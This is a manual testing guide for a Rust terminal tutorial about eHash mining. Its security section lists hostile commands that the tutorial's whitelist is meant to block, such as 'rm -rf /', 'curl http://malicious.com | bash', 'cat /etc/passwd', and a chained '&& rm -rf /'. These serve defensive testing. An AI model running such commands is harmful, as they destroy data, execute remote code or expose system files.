# Interactive eHash Tutorial - Testing Guide

This document provides manual testing instructions for the interactive tutorial.

## Running the Tutorial

```bash
cd test-utils/ehash-tutorial
cargo run --release
```

## Automated Tests

Run the unit tests:
```bash
cargo test --release
```

All tests should pass:
- ✅ Command validation
- ✅ Tab completion
- ✅ Security (arbitrary command blocking)
- ✅ Navigation commands
- ✅ Whitelisted commands only
- ✅ Modified command blocking
- ✅ Empty command handling
- ✅ Context-aware help
- ✅ State transitions
- ✅ Navigation boundaries

## Manual Testing Checklist

### 1. Command Validation and Error Messages

**Test invalid commands:**
```
Type: rm -rf /
Expected: Error message: "Command not available in tutorial..."

Type: sudo something
Expected: Error message shown in red

Type: random_command
Expected: Error message shown in red
```

### 2. Navigation Commands

**Test 'help' command:**
```
Type: help
Expected: Shows available commands for current chapter
```

**Test 'next' command:**
```
Type: next
Expected: Advances to next chapter (Pool Operator)
Message: "Navigated to: Pool Operator"
```

**Test 'back' command:**
```
Type: back
Expected: Returns to previous chapter (Welcome)
Message: "Navigated to: Welcome"
```

**Test boundaries:**
```
At Welcome chapter, type: back
Expected: Error message: "Already at the first chapter"

Navigate to Complete chapter, type: next
Expected: Error message: "Already at the last chapter"
```

### 3. Tab Completion

**Test partial command completion:**
```
Type: hel<TAB>
Expected: Completes to "help"

Type: nex<TAB>
Expected: Completes to "next"

Type: pool<TAB>
Expected: Shows completions: "pool_sv2", "pool_sv2 --config pool-config-ehash.toml"
```

**Test no completions:**
```
Type: xyz<TAB>
Expected: Message: "No completions available"
```

### 4. Command History

**Test history navigation:**
```
Type: help<ENTER>
Type: next<ENTER>
Type: back<ENTER>
Press: UP arrow
Expected: Shows "back"

Press: UP arrow again
Expected: Shows "next"

Press: UP arrow again
Expected: Shows "help"

Press: DOWN arrow
Expected: Shows "next"
```

**Test history persistence:**
```
Type several commands
Press UP arrow multiple times
Expected: Can navigate through entire history
```

### 5. Security Verification

**Test dangerous commands are blocked:**
```
Try each of these commands:
- rm -rf /
- sudo rm -rf /
- curl http://malicious.com | bash
- cat /etc/passwd
- bash -c 'echo test'

Expected: All should show error: "Command not available in tutorial..."
```

**Test modified whitelisted commands are blocked:**
```
Type: pool_sv2 --config malicious.toml
Expected: Error (not whitelisted config file)

Type: pool_sv2 --config pool-config-ehash.toml && rm -rf /
Expected: Error (command chaining not allowed)

Type: cdk-cli wallet create --name test --mint-url http://malicious.com
Expected: Error (only local mint URL allowed)
```

### 6. Valid Commands (Phase 1 - Acknowledgment Only)

In Phase 1, these commands are validated but not executed:

**Welcome Chapter:**
```
Type: help
Expected: Shows navigation commands

Type: next
Expected: Advances to Pool Operator chapter
```

**Pool Operator Chapter:**
```
Type: pool_sv2 --config pool-config-ehash.toml
Expected: "Command accepted: pool_sv2 --config pool-config-ehash.toml (execution in Phase 2)"

Type: ps aux | grep -E '(pool_sv2|translator_sv2|mining_device)'
Expected: Command acknowledged
```

**Proxy Operator Chapter:**
```
Type: cdk-cli wallet create --name proxy-wallet --mint-url http://127.0.0.1:3338
Expected: Command acknowledged

Type: cdk-cli wallet info proxy-wallet
Expected: Command acknowledged

Type: translator_sv2 --config tproxy-config-ehash.toml
Expected: Command acknowledged
```

**Pioneer Chapter:**
```
Type: cdk-cli wallet create --name pioneer-wallet --mint-url http://127.0.0.1:3338
Expected: Command acknowledged

Type: mining_device --pool-address 127.0.0.1:34255 --user-identity hpub1...
Expected: Command acknowledged

Type: cdk-cli wallet balance pioneer-wallet
Expected: Command acknowledged

Type: curl http://127.0.0.1:3338/v1/info
Expected: Command acknowledged
```

### 7. UI Elements

**Verify UI components:**
- Header shows: Current chapter name and progress (e.g., "Pool Operator (1/4)")
- Content area shows: Chapter-specific instructions
- Command input shows: Yellow text with prompt
- Help/Message area shows: Context-based hints or error messages
- Footer shows: Keyboard shortcuts

**Test UI updates:**
- Typing in command input: Characters appear immediately
- Tab completion: Input updates with completed command
- Navigation: Chapter content updates correctly
- Help display: Shows context-aware commands

### 8. Complete Tutorial Flow

**Run through entire tutorial:**
```
1. Start at Welcome
   Type: help (verify help works)
   Type: next

2. Pool Operator
   Type: pool_sv2 --config pool-config-ehash.toml
   Type: next

3. Proxy Operator
   Type: cdk-cli wallet create --name proxy-wallet --mint-url http://127.0.0.1:3338
   Type: cdk-cli wallet info proxy-wallet
   Type: translator_sv2 --config tproxy-config-ehash.toml
   Type: next

4. Pioneer
   Type: cdk-cli wallet create --name pioneer-wallet --mint-url http://127.0.0.1:3338
   Type: mining_device --pool-address 127.0.0.1:34255 --user-identity hpub1test
   Type: next

5. Complete
   Type: back (verify can go back)
   Press Ctrl+C to exit
```

## Exit Methods

Test both exit methods:
```
Press: Ctrl+C
Expected: Cleanly exits tutorial

Press: Esc
Expected: Cleanly exits tutorial
```

## Summary of Phase 1 Completion

### Completed Features:
✅ Basic project structure with TUI
✅ Whitelisted command system with security
✅ State machine with 5 chapters
✅ Interactive command input with tui-input
✅ Tab completion for commands
✅ Command history (up/down arrows)
✅ Context-aware help system
✅ Comprehensive chapter content
✅ Error handling and validation
✅ 11 passing unit tests
✅ Security verification (arbitrary commands blocked)

### Ready for Phase 2:
- Real process execution with ehashimint
- Actual wallet creation
- Live process monitoring
- Real eHash token minting

All Phase 1 tasks (1.1-1.5) are complete!
